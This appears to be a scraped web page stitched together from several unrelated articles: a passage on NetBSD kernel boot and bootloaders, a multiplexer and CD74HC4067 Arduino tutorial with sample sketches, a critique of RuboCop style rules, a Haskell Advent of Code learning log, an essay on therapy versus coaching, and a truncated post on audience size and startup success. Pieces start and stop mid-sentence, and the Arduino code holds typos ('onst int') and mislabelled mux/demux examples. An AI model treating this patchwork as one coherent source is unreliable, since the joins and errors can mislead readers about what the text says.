<p>We are used to thinking that programs start with some kind of <code>main</code> function. Those of us who have studied libraries or flow of execution can recall a lower level <code>_start</code> function that was called when the program was loaded into memory. In ELF executables, the program actually starts at an entry point that is defined inside the header of the file (<code>Entry point address</code>).
We can easily verify this claim using the readelf program on our kernel binary:</p>

<div><pre><code data-lang="bash">$ readelf -h ./netbsd

  Number of section headers:         <span>39</span>
  Section header string table index: <span>37</span></code></pre></div>

<p>We can now check the name of the symbol with such an address, but only if we use non stripped kernel!</p>

<div><pre><code data-lang="bash">$ readelf --syms ./netbsd.gdb | grep ffffffff80209000
 <span>41333</span>: ffffffff80209000    <span>0</span> NOTYPE GLOBAL DEFAULT <span>1</span> __text_user_end
 <span>48452</span>: ffffffff80209000 <span>1096</span> FUNC   GLOBAL DEFAULT <span>1</span> start</code></pre></div>

<p>The starting function for our kernel is <code>start</code>.
Before we look into this function, we need to understand how the CPU’s knows this starting point.
Before the operating system can execute the program, compiled into ELF format, it has to load it into memory.
When the program runs on bare metal (without the operating system), it needs to take care of loading into memory by itself.
This is one of the reasons why we need programs such as bootloaders.</p>

<h2 id="a-few-words-about-bootloaders">A Few Words About Bootloaders</h2>

<p>There are a lot of possible ways and programs we can use to setup our platform.
Different boot loader programs such as <code>grub</code> or <code>u-boot</code> can be configured to work together on various hardware and support operating systems.
Early loader programs provide much flexibility in configuration.
I mentioned earlier two partition schemes: GPT and MBR, both can be used together as a hybrid.
I don’t want go too deeper into disk layout as such a description would end up with multiple tables and descriptions, so I will focus on the NetBSD kernel initialization for the default configuration.</p>

<p>After the BIOS finds a valid sector (with <code>0xAA55</code> signature), it loads the first disk sector (MBR) to physical address <code>0x7c00</code> . It also sets the <code>DL</code> register to drive the number from which MBR was loaded, and after that is done, firmware executes the loaded data.
For the x86 platform, the first two bootloaders are MBR (<code>mbr(8)</code>) and PBR whose names correspond to the sectors where they are placed: Master Boot Record and Partition Boot Record.
Traditionally, the MBR code relocates itself to a different physical memory location (<code>0x600</code>) and then locates the active
partition, reads its first sector (PBR) to the address <code>0x7c00</code> and jumps to it.
The PBR is designed to work with the classical NetBSD chain where it is loaded by the own MBR as well as to work with GPT partition, in both cases there is a difference in behavior.
In the case of GPT the <code>EAX</code> register will contain the constant <code>!GPT</code> (in hex: <code>54504721</code>) and the MBR structure, which contains Logical Block Address (LBA) from which was loaded and some extra information like OS type or GPT partition …</p></div></div>

<p>A <strong>multiplexer</strong> is a combination circuit that has several inputs and a single data output. This allows you to select the step of only one of its inputs to channel it to its output. That is, you could select from which input to take the data or bit at the input and ignore the rest of the inputs. This is very common in electronics when several connections need to share a single line or bus.</p>
<p>That is, by controlling the multiplexer you can <strong>select the appropriate input at any time</strong>. This makes it possible to work with multiple input devices at the same time without them interfering with each other, even though there is only one connection. Also, you should know that usually a demultiplexer is used in conjunction with the multiplexer in many projects .</p>

<h2><span id="What_is_a_multiplexer">What is a multiplexer?</span></h2>
<p><img src="https://www.oshardware.net/wp-content/uploads/2020/01/multiplexor.jpg" alt="multiplexor" width="830" height="480" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20830%20480'%3E%3C/svg%3E" data-lazy-src="https://www.oshardware.net/wp-content/uploads/2020/01/multiplexor.jpg"></p>
<p>These combinatorial services called <strong>multiplexers</strong> are usually not complex. They are composed of a few logic gates depending on their amount of data and control inputs could increase the complexity. They usually include <span><em>2<sup>n&nbsp;</sup></em> inputs and a single output, as well as control lines. And several of them can be used in combination to increase that number of available inputs.</span></p>
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->


<p>It can be understood as a selector. For example, imagine you have a very simple one with two inputs, the simplest one you can build. That circuit will have a single control input and output. If the inputs are A and B, with the control input you can control if it is A who passes his value to the output S or if it is B who does it. To do this, you only have to vary the value of the control line C. For example, if C=0 it will be A and if C=1 it will be B.</p>
<p>As you will understand, if there are more inputs you will need more <strong> control inputs</strong> for selection. In fact, the multiplexer is a special type of decoder, with an enable signal for each AND gate included and an OR gate between the output and the AND gates. That way it can be easily selected.</p>
<p>As for its applications, you can use it for a lot of things:</p>
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->


<ul>
<li>Input selector to share a single bus or line when you have multiple inputs.</li>
<li>Serializer to take the value of each of your entries in order.</li>
<li>For multiplexed transmission using the same connection lines for various device data. For example, imagine you want to use the same data pin of a microcontroller to connect several device outputs, but it can only send information one at a time .</li>
<li>Perform logical functions, etc.</li>
</ul>
<h3><span id="Multiplexer_types">Multiplexer types</span></h3>
<p>Depending on the way the transmission is divided, there are several types of multiplexers or multiplexing:</p>
<ul>
<li>By frequency division</li>
<li>By time division</li>
<li>By code division</li>
<li>By wavelength division</li>
</ul>
<p>As you can imagine, they are controlled by frequency, by time through a clock, by binary code, and by wavelength. But here I’m only interested in the conventional…</p>
<p>In addition to the types, as with the demultiplexer, you can find it with <strong>more or less channels</strong> 2, 4, 8, 16, etc., depending on what you need for your DIY projects.</p>
<h3><span id="Differences_with_a_demultiplexer">Differences with a demultiplexer</span></h3>
<p><img src="https://www.oshardware.net/wp-content/uploads/2020/01/demultiplexor.jpg" alt="demultiplexor" width="830" height="460" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20830%20460'%3E%3C/svg%3E" data-lazy-src="https://www.oshardware.net/wp-content/uploads/2020/01/demultiplexor.jpg"></p>
<p>In digital electronics there is the <strong>demultiplexer</strong>, a combinational circuit that is the antagonist of the multiplexer. In this case there will only be one input of information, but it can be transmitted through its various outputs. That is, in this case, the control signals will decide to which output the input data is transferred.</p>
<p>If you have a demultiplexer at the output of a multiplexer, you can have a very useful system for learning how both devices work.</p>
<h2><span id="Where_to_buy">Where to buy?</span></h2>
<h2><img src="https://www.oshardware.net/wp-content/uploads/2020/01/modulo-multiplexor-demultiplexor.jpg" alt="multiplexor demultiplexor" width="830" height="600" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20830%20600'%3E%3C/svg%3E" data-lazy-src="https://www.oshardware.net/wp-content/uploads/2020/01/modulo-multiplexor-demultiplexor.jpg"></h2>
<p>These devices are usually implemented on very simple DIP chips. You can find them in a variety of brands and with a number of inputs or outputs in case of a demultiplexer. In addition, they are easily found in various specialized media or online stores. If you are interested in buying one at a good price, these can be good examples to start with your projects:</p>
<ul>
<li></li>
<li></li>
<li></li>
<li><a href="https://www.amazon.com/dp/B011NMZP7G?tag=oshardaware-20&amp;linkCode=ogi&amp;th=1&amp;psc=1" title="CD74HC4067 16-channel Multiplexer/Demultiplexer" target="_blank" rel="nofollow" data-aawp-product-id="B011NMZP7G" data-aawp-product-title="Analog Digital MUX Breakout Board Module" data-aawp-click-tracking="true">CD74HC4067 16-channel Multiplexer/Demultiplexer</a></li>
</ul>
<p>I advise you to read the datasheets of their manufacturers to get a clear idea of their pinout, as they may vary depending on the manufacturer or type you have purchased.</p>
<h4><span id="cd74hc4067">cd74hc4067</span></h4>
<p>In addition, as you can see, there are also very good modules that allow you to have both devices in one. This is the case of the <strong> known CD74HC4067</strong>, a small module with TTL technology that can help you to work with its 16 banals in a bidirectional way, having MUX/DEMUX. That is, you can use it as a kind of intelligent switch.</p>
<p>Thus, your Arduino can read and write on up to 1<strong>6 different devices</strong> with only 5 pins, 4 of them used for control and an additional one to pick up the signal to be read or written according to the selected channel.</p>
<p>The good thing about this chip is that it works with both digital and analog signals, so it is compatible with many sensors that work in analog and other digital chips, as well as many different electronic elements. It gives great versatility. That is why they are also called I/O expanders or input/output amplifiers .</p>
<p>You could even use it for the serial port communications, the <a href="https://www.oshardware.net/arduino-i2c-bus/">I2C bus</a>, or the SPI, which we have already discussed on other occasions.</p>
<p>However, before working with it, you must make sure that you comply with the voltages and intensities that this circuit admits so as not to damage it. For example, in this case it can provide up to 20 mA, as well as a voltage of 2 to 6v. However, if you want to work with higher currents you could use a relay or a transistor.</p>
<h2><span id="Integration_with_Arduino">Integration with Arduino</span></h2>
<p><img src="https://www.oshardware.net/wp-content/uploads/2018/05/Arduino-101.jpg" alt="Arduino with Bluetooth" width="830" height="500" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20830%20500'%3E%3C/svg%3E" data-lazy-src="https://www.oshardware.net/wp-content/uploads/2018/05/Arduino-101.jpg"></p>
<p>One way to have more inputs on your Arduino board or more outputs is to use these multiplexers and demultiplexers. With them you will avoid having to buy a higher priced board that has more pins, or having to use other tricks to be able to connect everything you need.</p>
<p>For example, you can use a ‘string’ module MUX and DEMUX to have both in one element, and then simply integrate it into your Arduino project. With the CD74HC4067 you can connect it very easily, so follow these rules:</p>
<ul>
<li>Vcc of the MUX/DEMUX chip you must connect it to Arduino Vcc or 5V.</li>
<li>GND, the ground, must be connected to Arduino’s GND.</li>
<li>The pins marked S0, S1, S2, S3 control the active channel, with four Arduino digital I/O, such as D8, D9, D10 and D11.</li>
<li>The EN is also enabled, so that it works as a multiplexer you can connect it to Arduino’s GND.</li>
<li>And GIS is the output signal that will determine the selected channel. It can be connected to Arduino or any device that needs to read the output. In this case I have connected it to</li>
<li>A0 to get the values from Arduino itself.</li>
<li>At the other end of the module you will have the inputs in this case, which are C0-C10 that you can connect to your devices.Once connected, the Arduino code can be simple.</li>
<li>Arduino IDE’s <strong>sketch as multiplexer</strong> can be as follows (this code will only turn their channels off and on respectively, but you can modify it to make the project you want):</li>
</ul>
<pre title="">
const int muxSIG = A0;
const int muxS0 = 8;
const int muxS1 = 9;
const int muxS2 = 10;
const int muxS3 = 11;
 
int SetMuxChannel(byte channel)
{
   digitalWrite(muxS0, bitRead(channel, 0));
   digitalWrite(muxS1, bitRead(channel, 1));
   digitalWrite(muxS2, bitRead(channel, 2));
   digitalWrite(muxS3, bitRead(channel, 3));
}
 
void setup()
{
   pinMode(muxSIG, OUTPUT);
   pinMode(muxS0, OUTPUT);
   pinMode(muxS1, OUTPUT);
   pinMode(muxS2, OUTPUT);
   pinMode(muxS3, OUTPUT);
}
 
void loop()
{
   for (byte i = 0; i &amp;lt; 16; i++)
   {
      SetMuxChannel(i);
      digitalWrite(muxSIG, HIGH);
      delay(200);
      digitalWrite(muxSIG, LOW);
      delay(200);
   }
}

</pre>
<p>If you want to use it as a DEMUX, you should only consider that C0-C10 would be the outputs and GIS would be the input. In case you want to use it as a demultiplexer, the code would change like this:</p>
<pre title="">
onst int muxSIG = A0;
const int muxS0 = 8;
const int muxS1 = 9;
const int muxS2 = 10;
const int muxS3 = 11;
 
int SetMuxChannel(byte channel)
{
   digitalWrite(muxS0, bitRead(channel, 0));
   digitalWrite(muxS1, bitRead(channel, 1));
   digitalWrite(muxS2, bitRead(channel, 2));
   digitalWrite(muxS3, bitRead(channel, 3));
}
 
void setup()
{
   Serial.begin(9600);
   pinMode(muxS0, OUTPUT);
   pinMode(muxS1, OUTPUT);
   pinMode(muxS2, OUTPUT);
   pinMode(muxS3, OUTPUT);
}
 
void loop()
{
   for (byte i = 0; i &amp;lt; 16; i++)
   {
      SetMuxChannel(i);
      byte muxValue = analogRead(muxSIG);
 
      Serial.print(muxValue);
      Serial.print(&amp;quot;t&amp;quot;);
   }
   Serial.println();
   delay(1000);
}

</pre>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Consider a hypothetical class that filters out unsafe HTML elements:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>else</span>
      <span>nil</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>The default RuboCop settings would have us change it to this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>super</span> <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Let us feast on a three-course meal of opinion about why this is
worse.</p>

<h2 id="that-nil-was-written-for-a-purpose">That <code>nil</code> Was Written For A Purpose</h2>

<p>My first beef — the hors d’oeuvre, if you will — is that
<code>Style/EmptyElse</code> wants us to change from an <em>explicit</em> <code>nil</code> return
value to an <em>implicit</em> one. It says there is a “redundant
else-clause”. I’ll tell you what’s redundant: the <code>Style/EmptyElse</code>
cop.</p>

<p>This cop would prefer that the <code>else</code> clause did not exist, like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>In terms of behaviour at runtime, this is exactly the same. In terms
of readability, it is not.</p>

<p>The explicit <code>nil</code> in the original implementation implies that the
method is being called for its return value — that it’s probably
functional, with inconsequential side effects.</p>

<p>Making the <code>nil</code> implicit says that <em>the return value is not
important</em>. This method now reads like it’s implemented by avoiding
side effects within <code>super</code>.</p>

<p>So which one is it? Is the filter supposed to work by returning <code>nil</code>,
or does it work by avoiding the side effects in the <code>super</code> call?
These are very different behaviours, and RuboCop just changed the
human interpretation from the correct one to the wrong one.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="its-not-a-guard-clause">It’s Not A Guard Clause</h2>

<p>My other beef (the main course) is with <code>Style/GuardClause</code>. This cop
takes conditionals and turns one of the branches into a guard clause
— something like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>return</span> <span>nil</span> <span>unless</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>

    <span>super</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Again, the runtime behaviour is identical, but the cop makes it less
readable.</p>

<p>Guard clauses are for bailing out early when you know that it’s not
necessary to run the rest of the method. They are usually trivial in
comparison to the <em>real</em> work done by the rest of the method. For
example, if we were implementing a sorting algorithm, then we could
have a guard clause for inputs with one element or less — there is
no need to run a sorting algorithm when there is nothing to sort.</p>

<p>Except in this case, we’re not “guarding” the rest of the method from
being run. That conditional is the <em>entire raison d’être of the
class</em>. It’s the most important part. The whole purpose of a filter is
to decide what elements stay in, and what elements get filtered out.</p>

<p>RuboCop has taken the most important part of the class and turned it
into a trivial-looking guard clause.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="branching-should-look-like-branching">Branching Should Look Like Branching</h2>

<p>My final qualm (is there such a thing as dessert beef?) is with
<code>Style/GuardClause</code> removing the obvious indenting of the two
branches, making it look like straight-line procedural code.</p>

<p>Most of the time, developers don’t so much <em>read</em> code as they do
<em>scan</em> code. We don’t read from left to right, top to bottom, as if
the codebase were the world’s most boring novel. We skim over code,
navigating by the colours of syntax highlighting and the shapes
made by indentation.</p>

<p>So when we’re skimming over the original code, trying to find the
conditional — which we’ve already established as being the most
important part of the class — we will find two landmarks: a line
that starts with a brightly coloured <code>if</code> keyword, and indentation
that suggests a conditional.</p>

<p>But skimming over the guard-clause-enhanced code we see neither of
these landmarks. Instead, we find indentation that suggests
<em>procedural</em> code: a series of statements that run from top to bottom.
RuboCop has taken an obvious conditional and reshaped it to look like
there is no conditional.</p>

<p>The <code>Style/GuardClause</code> cop is double bad, and misses out on two
doughnuts.</p>

<h2 id="disclaimerconclusion">Disclaimer/Conclusion</h2>

<p>I don’t dislike RuboCop. It’s well made, and a useful tool.</p>

<p>The problem starts when it is viewed not as a tool, but as a set of
divine commandments. Thou shalt not make implicit <code>nil</code>s explicit.
Thou shalt not write long-form conditionals. Thus saith the RuboCop.</p>

<p>This is not necessarily a problem with RuboCop itself — it’s a
problem with how people sometimes use RuboCop. One could argue that
the defaults aren’t great, but they are not a problem until someone
hooks them up to CI.</p>

<p>My only aim here is to disabuse readers of the notion that RuboCop can
only make code better. It’s a tool, and whether it helps or hurts
depends on how it’s used. Don’t be afraid to disable cops if you can’t
see how they benefit the team.</p>

<p>For the past few years I’ve been trying to learn haskell in various ways but
have never been able to stick to the method, let alone actually “become
productive” in Haskell.</p>
<p>Since I’ve decided to spent more time on tinkering during the evenings, I
thought it would be a nice idea to document my learning process.</p>
<p>The general idea is that I will do the challenges from the Advent of Code (2020
edition) and implement them in Haskell. And since there are 16 days left before
“it begins”, I’ll kick off with doing some of the challenges from last year to
prepare.</p>
<p>The documentation part will not really involve the learning of the language
itself, but more on “everything ephemeral” (the plumbing?). I’ll try to
elaborate on some of the “typical difficult Haskell stuff” as I encounter them
(and when I deem them appropriate).</p>
<p>I’m convinced that Haskell in itself is quite an easy language to grasp (once
you manage to get “some functional programming practices to click”), but that
there are a number of barriers that prevent people from becoming productive in
it.</p>

<p>During this attempt to grasp Haskell I will be working on my Windows 10 laptop
under WSL2 running an Ubuntu 20.04 installation. My notes will assume that a
sort of sane setup for an editor is available.</p>
<p>I use vim myself, with a fairly minimal vimrc (no haskell specific
configuration) and the following packages:</p>
<div><pre><code data-lang="shell">ale/ coc.nvim/ fzf/ ultisnips/ vim-go/ vim-repeat/ vim-surround/ vim-vinegar/
</code></pre></div><p>To get started I installed the GHC compiler through the default Ubuntu package
manager:</p>
<p>And then verified that installation has succeeded by running</p>
<div><pre><code data-lang="shell">&gt; ghci --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; ghc --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; cabal --version
cabal-install version 2.4.0.0
compiled using version 2.4.0.1 of the Cabal library
</code></pre></div><p>This ensured that all binaries are properly available (in path) to get going.</p>

<p>For those who do not know, The Advent of Code (TAOC) is a yearly event in which
50 programming assignments are made available during the first 25 days of
december, outlining a glorious story usually involving santa, elves, presents
and the (not so) daily challenges they face.</p>
<p>Every day two programming challenges are presented that take a certain input
(your daily input file) and require you to do StuffTM with that input to
accomplish a certain task. Don’t worry, it will all become clear when you
actually try this.</p>
<p>You can register on <a href="https://adventofcode.com/">https://adventofcode.com</a>.</p>

<p>With the environment setup I create a fresh directory for the first day:</p>
<p>and paste my input for the first challenge into taoc19/day1/input.txt</p>
<p>Since I’m not trying to do anything fancy right now, I create a new cabal
package with the <code>cabal init</code> command.  During the interrogation cabal gives
me, I stick with the defaults, except when asked whether I’m building a package
or executable, in which I choose ‘executable’.</p>
<p>This gives me a few files that I can use to start building.</p>
<p>To start the process I need to get my data from the input.txt file into a
function. Since I’ve read something about Haskell before (and some quick
googling) I try using the readFile function (from the stdlib/Prelude) in GHCi
and voila:</p>
<div><pre><code data-lang="haskell"><span>let</span> raw <span>=</span> readFile <span>"input.txt"</span>
</code></pre></div><p>The problem arises when I put the <code>let raw = readFile 'input.txt'</code> line in my
main do-block. Haskell has this notorious Monad thing going on, which I do not
yet fully grasp. But you don’t need to understand it to use it, so a small
Google session quickly led to the insight that I need to “reverse arrow put”
the result of the <code>readFile</code> call into a variable instead of using <code>let</code>. This
leads to a really minimal Main.hs file</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>
        print raw
</code></pre></div><p>when loadng it into GHCi and running main, it nicely outputs my input data.
First win achieved!</p>
<div><pre><code data-lang="shell">Prelude&gt; :l Main.hs
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
&lt;your data here&gt;
</code></pre></div><p>Step two involves splitting up the input into lines and converting these lines
into an array of integers.</p>
<p>To accomplish the first step, Haskell has a handy function <code>lines</code> (in the
Prelude) available. The second part involves the <code>read</code> function (also a
Prelude thing) and specifying the type of the statement. Initially I created a
separate function <code>stoi</code> for this</p>
<div><pre><code data-lang="haskell"><span>stoi</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>stoi</span> <span>=</span> rread
</code></pre></div><p>but decided that “casting” the data inline would still be perfectly readable
(and perhaps even clearer), resulting in:</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        print nums
</code></pre></div><p>Achievement 2 unlucked, I’m finally ready to do something with my data.</p>
<p>Part 1 of the challenge involves calculating how much fuel we need according to
a certain formula, so for every input we apply a function to it, and sum the
results.o</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> <span>=</span> id <span>-- todo</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        <span>-- apply the fuelRequired function to all the inputs and sum the result</span>
        <span>let</span> totalFuel <span>=</span> sum <span>$</span> map fuelRequired nums
        print totalFuel
</code></pre></div><p>which if we load it into GHCi gives us the sum of all the weights.</p>
<div><pre><code data-lang="shell">*Main&gt; :edit
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
<span>9961383</span>
*Main&gt;
</code></pre></div><p>The actual calculation of required fuel involves dividing the weight by 3,
rounding it down and subtracting 2, giving me a really simple to implement
fuelRequired function.</p>
<div><pre><code data-lang="haskell"><span>-- fuelRequired should be the mass x, divided by 3, minus 2</span>
<span>-- with a minimum of 0.</span>
<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> x <span>=</span> max <span>0</span> <span>$</span> (div x <span>3</span>) <span>-</span> <span>2</span>
</code></pre></div><p>Running the main file in GHCi again (after reloading the Main.hs file) gives me
a number that, when entered in the answer field on AOC tells me I’m on the
right track! Yay!</p>

<p>Oh, surprise, physics kicks in. Turns out, fuel weighs something as well, so
we’ll have to calculate the amount of fuel required to carry the fuel, which
also requires fuel to carry, etc.</p>
<p>This looks like a typically recursive situation where fuel that requires no
fuel (i.e. weighing 9 or less) serves as a perfect termination case. Let’s try
to write this as a recursive function with a guard in it.</p>
<div><pre><code data-lang="haskell"><span>-- recursiveFuelRequired is implemented as a recursive function</span>
<span>-- where we terminate recursion as soon as there is no more</span>
<span>-- fuel required for a certain component.</span>
<span>recursiveFuelRequired</span> x
        <span>|</span> x <span>==</span> <span>0</span>    <span>=</span> <span>0</span>
        <span>|</span> otherwise <span>=</span> <span>let</span> thisFuel <span>=</span> fuelRequired x <span>in</span>
                        thisFuel <span>+</span> recursiveFuelRequired thisFuel
</code></pre></div><p>and then calculating the actual total fuel required in the same way as before,
but now with this new recursive function:</p>
<div><pre><code data-lang="haskell"><span>let</span> totalFuel <span>=</span> sum <span>$</span> map recursiveFuelRequired nums
<span>print</span> totalFuel
</code></pre></div><p>output copy-paste into solution field, press submit, and… GREAT SUCCESS!</p>
<p>I’ll cover my solving of the Day 2 challenges somewhere in the upcoming days.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7d1dab7a3bc95894eb5c"><div><p>I've heard repeatedly that "therapy is about the past while coaching is about the future." But this isn't quite right.</p><p>Coaching necessarily incorporates relevant elements of the present and even past. Plus, therapy doesn't <em>just</em> pick apart the past, black couch &amp; Freudian style.</p><p>Therapy also tends to construct a perpetual present for the patient. Sometimes slowing down to focus on the present helps patients' mental health. Other times, though, over-focusing on the present does more harm than good.</p><h2>The perpetual present pattern</h2><p>Here's what my clients describe from their time in therapy:</p><p>Client enters therapist's office. Therapist asks them how they're doing. Client describes various issues from the past 1-2 weeks, many of which are recurring (e.g. procrastination, indecision, etc).</p><p>Therapist validates client's feelings, asks probing questions to explore them, supports where the client is right now. Client has plenty to say about these things, speaks their mind. </p><p>This easily absorbs the therapy hour. Client leaves, not exactly dissatisfied but not exactly satisfied, either. </p><p>Even if the two discussed possible courses of action for the client, the therapist (being a therapist and not some kind of “accountability coach”) is not expected to hold the client to these in any important way. Instead, the client can crop up afresh each time with feelings new or old, accomplishments and failures of any kind, and be accepted all the same.</p><p>This is therapy's perpetual present.</p><h2>Costs vs. benefits</h2><p>Now, therapy's perpetual present is not <em>necessarily</em> bad. Some patients have withstood past experiences so traumatic that they are now meaningfully held back from their own futures until the past has been resolved, healed, or at least acknowledged and analyzed. For these patients, the therapeutic womb and its perpetual present can be a blessed gift, an investment that makes extension into the future possible again... a bit later.</p><p>But most of us are not <em>so</em> tightly past-bound. Instead, our past tethers us with loose reins, or we hold the past lightly in one hand as we reach towards the future with the other. Future-oriented clients may not be best-served by even friendly and warm invitations to wallow in the present.</p><p>Some people clearly need therapy, perhaps a few people clearly do <em>not</em> need therapy. In the intersection, there is a large overlapping set of prospective client-patients: they have things to talk about and work through, therapists would welcome them, but they're not so unwell that starting with coaching (philosophical or otherwise) would be unwise.</p><p><strong>Time orientation is one dimension along which these patient-clients could consider their needs and whose help to seek</strong>. </p><p>Do they (you) want to forage in the past? To dwell in the present? To stride into the future?</p><h2>Time orientation is a philosophical question</h2><p>This question about orienting one's life in time is not a matter of simple personal preference. Instead, <strong>time orientation itself raises deeply philosophical issues:</strong></p><ul data-rte-list="default"><li><p>How do the ways we think and speak about the past, present, and future affect personal identity?</p></li><li><p>How can we develop and exercise virtue as we attempt to learn from some elements of our past while setting others aside?</p></li><li><p>What are the costs and benefits, individually and socially, of existing more in the "here and now" vs. in the near or even far future?</p></li></ul><p>If you need help thinking through the possibilities for your future (and how to pursue them) more than you need an opportunity to air (i.e. belabor) the present, then coaching may be just the ticket. </p><p>And if the meta questions about the timeline of life interest you, then it may be <em>philosophical</em> coaching that you're after (<a href="https://www.pamelajhobart.com/contact">send me a message</a>).</p></div></div></div>]]>

Find the <a href="https://twitter.com/mxmzb/status/1329106639258087428">Twitter thread version here</a>.</em></p><p>A friend of mine is convinced that if you have a lot of followers on an arbitrary social media platform, you are in a much better spot to launch your product than without an audience. He points at people like Gary Vee, and Tai Lopez, implying that they are selling products purely on the back of their popularity. And although he has a point, I think this is extreme cherry-picking. In my opinion, it works for them for specific and unique reasons. </p><p>As I noticed, building an audience <strong>before having a product/service</strong> seems to be an evolving trend, even in the indie maker community. In my effort to find clearness, I've compiled a list of founders and influencers running businesses with differently sized audiences. I hope the examples will shed light on the correlation between large audiences and entrepreneurial success.</p><p>Before we start looking into this: You'll notice that when I write "audience", I <em>usually</em> refer to the Twitter following of a founder. That doesn't mean an audience can't be built on another platform, but it's what most tech founders associate with "audience". </p><p>Further, I will be referring to various sizes of audiences and grades of (routinely presumed) economic success. Those lines are blurry and defined by my intuition of what is what for the average indie maker.</p><h2>Large audience but little to no success</h2><p><em>A large audience in this context leans towards 50k and goes up infinitely. Little to no success means that the project/founder can not self-sustain or the project has died.</em></p><p>You have 50k followers on the platform of your choice. Will you be able to make your next startup successful with that many people behind your back?</p><p><a href="https://twitter.com/tjholowaychuk">TJ Holowaychuk</a> has 47k followers on Twitter (and 44k are occasionally seeing his contributions on GitHub). If you're a developer working with Node.js a lot, there is a good chance you've been using his code, or at least, code impacted by TJ.</p><p>TJ runs a software business called <a href="https://apex.sh/">Apex</a>, which offers monitoring/logging/uptime. I ran across it a few years ago and ever since haven't seen it build up a lot of momentum. Then, two months ago, I found <a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174?commentId=-MF0nsQqF-pLhijfLpgm">a comment by TJ on Indie Hackers</a>:</p><blockquote><p>Congrats! It's definitely tricky, even with my reasonably rare ~50k Twitter community it's still difficult, startups have it so easy in comparison.</p><p>-- <cite>TJ Holowaychuk</cite></p></blockquote><p>Maybe 50k is not enough. How about 2.6m? In May 2019, <a href="https://web.archive.org/web/20190528072150/https://www.instagram.com/arii/">Instagram influencer Arii</a> failed <a href="https://www.tyla.com/news/celebrity-instagram-influencer-with-26m-followers-struggles-to-sell-36-t-shirts-20190528">to sell 36 T-Shirts</a>. The story has been torn apart by media shortly after, with various theories on what had gone wrong. Fake followers, wrong audience, no marketing strategy, lousy product. I'm convinced it's everything except fake followers. Sure, she probably has many, but at 2.5m total, I am confident a few hundred thousand legitimate ones rule this out as the sole reason for failure.</p><p>Do you remember <a href="https://en.wikipedia.org/wiki/Beme">Beme</a>? The social app to <a 